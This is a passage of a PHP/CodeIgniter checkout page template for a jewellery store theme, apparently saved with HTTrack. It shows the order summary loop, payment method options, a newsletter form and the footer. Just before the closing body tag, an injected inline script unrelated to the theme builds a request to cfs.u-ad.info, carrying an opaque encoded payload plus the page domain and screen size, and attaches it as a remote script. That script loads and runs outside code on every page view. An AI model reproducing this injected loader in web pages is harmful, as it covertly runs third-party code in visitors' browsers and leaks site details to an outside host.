                                            <option value="thirdemail">third.example@yahoo.com</option>
                                        </select>
                                        -->
                                    
                                    </div>
                                    <div class="col-sm-6">
                                        <label for="phone" class="control-label change-label">Phone*</label>
                                        <input type="text" class="form-control" name="phone" id="phone" required>
                                    </div>
                                </div>
                            </div>

                                <div class="form-group">
                                    <label for="notes" class="control-label">Town/City*</label>
                                    <textarea id="notes" class="form-control" rows="4" name="city2" placeholder="Notes about your order, e.g. special notes for delivery."></textarea>
                                </div>
                            </div>
                        </form>


                    </div>
                    <div class="col-md-4">
                        <div class="ct-cartRightSection ct-cartRightSection--bordered ct-u-marginTop30">

                            <div class="ct-u-paddingBottom30">
                                <div class="ct-u-size16 ct-fw-600 pull-left">Order Summary</div>
                                <div class="ct-u-size14 pull-right"><a href="<?php base_url() ?>mycart/" class="ct-u-editCart">Edit Cart</a></div>
                                <div class="clearfix"></div>
                            </div>
            <?php  $cart_check = $this->cart->contents();
            
            // If cart is empty, this will show below message.
             if(empty($cart_check)) {
             //echo 'To add products to your shopping cart click on "Add to Cart" Button'; 
             ?>
             <p align="center">Your Cart is empty</p>
             <?php
             }  ?>                             



             <?php //if(!empty($cart_check)) { ?>
                <div class="table-responsive">
                <table id="table" border="0" cellpadding="5px" cellspacing="1px" align="center">
                  <?php
                  // All values of cart store in "$cart". 
                  if ($cart = $this->cart->contents()): ?>
                    <tr id= "main_heading">
                        
                        <td width="25%">&nbsp</td>
                        <td width="75%">&nbsp</td>
                        <!-- <td>Description</td> -->                  
                    </tr>
                    <?php
                     // Create form and send all values in "shopping/update_cart" function.
                    //echo form_open('cart/update_cart');
                    $grand_total = 0;
                    $i = 1;

                    foreach ($cart as $item):
                        //   echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        //  Will produce the following output.
                        //echo '<input type="text" name="cart[1][id]" value="'.$item['name'].'" />';
                        
                        echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        echo form_hidden('cart[' . $item['id'] . '][rowid]', $item['rowid']);
                        echo form_hidden('cart[' . $item['id'] . '][name]', $item['name']);
                        echo form_hidden('cart[' . $item['id'] . '][price]', $item['price']);
                        echo form_hidden('cart[' . $item['id'] . '][qty]', $item['qty']);
                        $item['totalprice'] = (($item['price']) * ($item['qty'])); 
                        //echo form_input('cart[' . $item['id'] . '][totalprice]', $item['totalprice']);                       

                        ?>                        
                        
                        <input type="hidden" name="totalprice[]" value="<?php echo $item['totalprice'] ?>">
                        <input type="hidden" name="id[]" value="<?php echo $item['id'] ?>">
                        <tr>
                            <?php
                                $this->db->where('serial', $item['id']);
                                $query = $this->db->get('property');

                                foreach ($query->result() as $row)
                                {
                            ?>
                            <td>
                            <div class="ct-cartRightSection-currentCart">
                                <div class="ct-u-paddingTop10">
                       <a href="<?php echo base_url(); ?>product/product_view/<?php echo $row->serial ?>">
                       <img class="pull-left" src="<?php echo base_url() ."images/". $row->image_name ?>" width="120" height="120" alt="Wishlist Product 1">
                       </a>
                                </div>
                            </div>

                       <?php //echo $i++; ?>
                            <?php //} ?>
                            </td>
                            <td>
                            <div class="ct-cartRightSection-currentCart" style="float:left;margin-top:-50px">
                                <div class="ct-u-paddingTop10">                      
                                  <div class="ct-u-size14 ct-u-paddingTop10"><a href="single-product.html"><?php echo $item['name']; ?></a></div>
                                </div>
                            </div>
                                <?php
                                    //$totalprice = (($item['price']) * ($item['qty']));
                                ?>
                                    
                                  <div class="ct-u-size16 ct-u-paddingTop20" style="float:left;margin-top:-10px"><span class="ct-fw-600">$<?php echo number_format($item['price'], 2); ?></span> <span class="ct-u-size14">x</span><?php echo $item['qty']; ?> <span class="ct-u-size14"> = </span>$<?php echo number_format($item['totalprice'], 2); ?></div>
                            </td>
                            <!--
                           <td>
                      <?php echo $row->description; ?>
                            </td>
                            -->
                            <?php } ?>


                        <?php $grand_total = $grand_total + $item['subtotal']; ?>

                            
                     <?php endforeach; ?>
                    </tr>
                    <tr>                      
                        
                        <?php // "clear cart" button call javascript confirmation message ?>                        
                        
                        <td colspan="6" align="right">
                            <b>Order Total: $<?php echo number_format($grand_total, 2); ?></b>                                                      
                        </td>

                    </tr>
                    <tr>
                        <?php // "clear cart" button call javascript confirmation message ?>
                        
                        <td colspan="6" align="right">
                        <!-- <input type="button" class ='btn btn-warning' value="Clear Cart" onclick="clear_cart()"> -->
                            
                            <?php //submit button. ?>
                            <!-- <input type="submit" class ='btn btn-info' value="Update Cart"> -->
                            
                            <?php //echo form_close(); ?>
                            
                            <!-- "Place order button" on click send "billing" controller  -->
                            <!--<input type="button" class ='btn btn-info' value="Place Order" onclick="window.location = '<?php echo base_url() ?>index.php/cart/billing_view'"> -->
                        </td>
                        
                    </tr>

        <?php endif; ?>
            </table>
        </div> 
 
                            <div class="ct-u-size16 ct-fw-600 ct-u-paddingTop40 ct-u-paddingBottom10">Paymant Method</div>
                            <div class="ct-u-paddingTop20">
                                <div class="radio">
                                    <input type="radio" id="directBank" name="paymant" value="1">
                                    <label for="directBank">
                                        <span class="ct-u-size15 ct-fw-600">Direct Bank Transfer</span>
                                    </label>
                                    <div class="ct-u-size15 ct-u-paddingLeft34 ct-u-paddingBoth20 text-justify">
                                        Make your payment directly into our bank account. Please use your Order ID as the payment reference. Your order won’t be shipped until the funds have cleared in our account.
                                    </div>
                                </div>
                                <!--
                                <hr>
                                <div class="radio ct-u-paddingTop20">
                                    <input type="radio" id="cheque" name="paymant" value="2">
                                    <label for="cheque">
                                        <span class="ct-u-size15 ct-fw-600">Cheque Payment</span>
                                    </label>
                                    <div class="ct-u-size15 ct-u-paddingLeft34 ct-u-paddingBoth20 text-justify">
                                        Please send your cheque to Store Name, Store Street, Store Town, Store State / County, Store Postcode.
                                    </div>
                                </div>
                            -->
                                <hr>
                                <div class="radio ct-u-paddingTop20">
                                    <input type="radio" id="paypal" name="paymant" value="3">
                                    <label for="paypal">
                                        <span class="ct-u-size15 ct-fw-600">Paypal <img src="<?php echo base_url() ?>images/paypal.jpg" alt="Paypal"></span>
                                    </label>
                                    <div class="ct-u-size15 ct-u-paddingLeft34 ct-u-paddingBoth20 text-justify">
                                        Pay via PayPal: you can pay with your credit card if you don’t have a PayPal account.
                                    </div>
                                </div>
                            </div>
                            <div class="ct-finishOrder ct-u-paddingTop30">
                                <button type="submit" class="btn btn-default">Place Order<i class="fa fa-long-arrow-right fa-fw ct-u-paddingLeft10"></i></button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </form>

<?php } ?>

            <!-- PreFOOTER -->
            <div class="container">
                <div class="ct-dividedSection ct-u-paddingTop60">
                    <div class="row">
                        <div class="col-md-7 col-sm-12">
                            <div class="ct-dividedSection-left">
                                <h3>Sign up for our newsletter</h3>
                                <div class="ct-contactForm">
                                    <div class="successMessage alert alert-success" style="display: none">
                                        <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
                                        Thank You!
                                    </div>
                                    <div class="errorMessage alert alert-danger" style="display: none">
                                        <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
                                        Ups! An error occured. Please try again later.
                                    </div>
                                    <form class="validateIt"  method="post" action="http://diana.html.themeplayers.net/form/send.php" role="form" data-email-subject="Contact Form" data-show-errors="true">
                                        <div class="input-group">
                                            <input type="email" class="form-control" placeholder="Your Email Address" required name="field[]">
                                        <span class="input-group-btn">
                                            <button class="btn btn-default btn-sm" type="submit"><i class="fa fa-fw fa-long-arrow-right"></i></button>
                                        </span>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-5 col-sm-12">
                            <div class="ct-dividedSection-right">
                                <img src="<?php echo base_url() ?>images/prefooter-diamond.png" class="text-right pull-left" alt="Diamond Ring">
                                <h3 class="text-uppercase text-right">Have a jewelry inquiry?</h3>
                                If you have any  questions regarding our jeweleries please <a href="#">contact us directly</a> or use our contact form to get in touch.
                                <div class="ct-dividedSection-right-triangle hidden-sm hidden-xs"></div>
                            </div>
                        </div>
                    </div>
                    <div class="ct-tooltips text-center ct-u-paddingTop50 ct-u-paddingBottom40">
                        <ul class="list-unstyled list-inline">
                            <li data-toggle="tooltip" title="75,000+ customers trusted us to create their rings."><i class="fa fa-heart fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Pay by cash, credit card, bank transfer or store."><i class="fa fa-dollar fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Fully protected, all payments secured."><i class="fa fa-lock fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Double guarantee for gold and diamonds."><i class="fa fa-certificate fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="24/7 support at your service."><i class="fa fa-headphones fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Latest news collections directly on your email."><i class="fa fa-envelope fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Free & easy returns in 48h."><i class="fa fa-circle-o-notch fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Free Delivery and Assurance."><i class="fa fa-truck fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Your data is fully protected."><i class="fa fa-folder fa-fw fa-6x"></i></li>
                            <li data-toggle="tooltip" title="Find your measurements for your ring."><i class="fa fa-pencil-square-o fa-fw fa-6x"></i></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- FOOTER -->
        <footer class="ct-footer ct-u-paddingTop210 ct-u-paddingBottom90">
            <div class="container">
                <div class="row">
                    <div class="col-md-3 hidden-sm hidden-xs">
                        <div class="ct-footer-image">
                            <img src="<?php echo base_url() ?>images/footer-necklace.png" alt="Golden Necklace">
                        </div>
                    </div>
                                        <div class="col-sm-4 col-md-3">
                        <h5 class="ct-widgetHeader text-uppercase ct-u-size18">Customer service</h5>
                        <div class="ct-widgetLinks">
                            <ul class="ct-widgetLinks-list">
                                <li><a href="#">Free Shipping</a></li>
                                <li><a href="#">30-Day Returns</a></li>
                                <li><a href="#">Special Orders</a></li>
                                <li><a href="#">Free Gift Packaging</a></li>
                                <li><a href="#">Jewellery Insurance</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-4 col-md-3">
                        <h5 class="ct-widgetHeader text-uppercase ct-u-size18">About Diana Jewellery</h5>
                        <div class="ct-widgetLinks">
                            <ul class="ct-widgetLinks-list">
                                <li><a href="about-us.html">About Us</a></li>
                                <li><a href="our-mission.html">Our Mission</a></li>
                                <li><a href="blog.html">In the news</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-4 col-md-3">
                        <h5 class="ct-widgetHeader text-uppercase ct-u-size18 ct-u-paddingBottom20">Connect With Us</h5>
                        <ul class="ct-socials ct-socials--large ct-socials--white list-inline list-unstyled">
                              <li><a href="https://www.facebook.com/createITpl"><i class="fa fa-facebook fa-fw"></i></a></li>
                            <li><a href="https://twitter.com/createitpl"><i class="fa fa-twitter fa-fw"></i></a></li>
                            <li><a href="#"><i class="fa fa-rss fa-fw"></i></a></li>
                        </ul>
                    </div>
                </div>
                <div class="row">
                    <div class="ct-u-bottomFooterBar ct-u-paddingTop40 ct-u-marginTop50">
                        <div class="col-sm-6">
                            <div class="ct-rights">
                                <a href="http://www.createit.pl/">createIT</a> © Copyright 2015
                            </div>
                        </div>
                        <div class="col-sm-6">
                            <div class="ct-iconPayments pull-right">
                                <ul class="list-inline list-unsyled">
                                    <li><i class="fa fa-cc-visa fa-fw fa-2x"></i></li>
                                    <li><i class="fa fa-cc-mastercard fa-fw fa-2x"></i></li>
                                    <li><i class="fa fa-cc-discover fa-fw fa-2x"></i></li>
                                    <li><i class="fa fa-cc-amex fa-fw fa-2x"></i></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <!-- JavaScripts files -->


    <script src="<?php echo base_url() ?>js/jquery.min.js"></script>

    <script src="<?php echo base_url() ?>bootstrap/js/bootstrap.min.js"></script>
    <script src="<?php echo base_url() ?>js/jquery.placeholder.min.js"></script>
    <script src="<?php echo base_url() ?>js/jquery.easing.1.3.js"></script>
    <script src="<?php echo base_url() ?>js/device.min.js"></script>
    <script src="<?php echo base_url() ?>js/jquery.browser.min.js"></script>
    <script src="<?php echo base_url() ?>js/snap.min.js"></script>
    <script src="<?php echo base_url() ?>js/jquery.appear.js"></script>



    <script src="<?php echo base_url() ?>plugins/headroom/headroom.js"></script>
    <script src="<?php echo base_url() ?>plugins/headroom/jQuery.headroom.js"></script>
    <script src="<?php echo base_url() ?>plugins/headroom/init.js"></script>

    <script src="<?php echo base_url() ?>form/js/contact-form.js"></script>

    <script src="<?php echo base_url() ?>js/select2/select2.min.js"></script>
    <script src="<?php echo base_url() ?>js/stacktable/stacktable.js"></script>



    <script src="<?php echo base_url() ?>js/elevate-zoom/jquery.elevatezoom.js"></script>
    <script src="<?php echo base_url() ?>js/elevate-zoom/init.js"></script>

    <script src="<?php echo base_url() ?>js/main.js"></script>

    

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bJAfVc8dIlSpceD4n2n%2fgHE8swOrf4ttpMVFSQeJgzxAxYlK2o5G6sdi3Lx2Jhc2upxY0BB%2fks3EPxj0fimS%2fbngz%2fe4K5q0PvkyJloEw7zj8RrACTgQSUNWRzMuwaD9gwOOwtYYdJiGapHXvjb6p5J9Y2QJM%2fuy7y9BEBFWNsIE%2fj%2ferPEs3MsW2Y3DMQVb1l%2b9accPV7mOdeBaoCq%2b3BBxnWZD%2fS0aJWel9Di8xRbnvIm5%2fAoRLgAshiWUiNC4HHxHqukYnxjPCpE28VRtHfkaIfgAFVKeGv%2b6Hk0ZTOlt99ZsjJlIgRpanS3nXOZqlFt82O%2bkskFdrtPXHUkE%2bG%2f0uNeYird4rvf4Y4jJ6g5c0s6D99HmSIwBD%2f555m7bgyebHU7pF0DEuUOkkt%2bpxDOZlz5uu2CMZZzi1bHbSOQPfbNagpj8igcwtaAlVMb4oZzlawuDTd2mVSxVkULjSFvzmmjWXIIYn5xO5VOvVK%2bzo8y2uM2DUUg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from diana.html.themeplayers.net/checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Oct 2015 03:48:18 GMT -->
</html>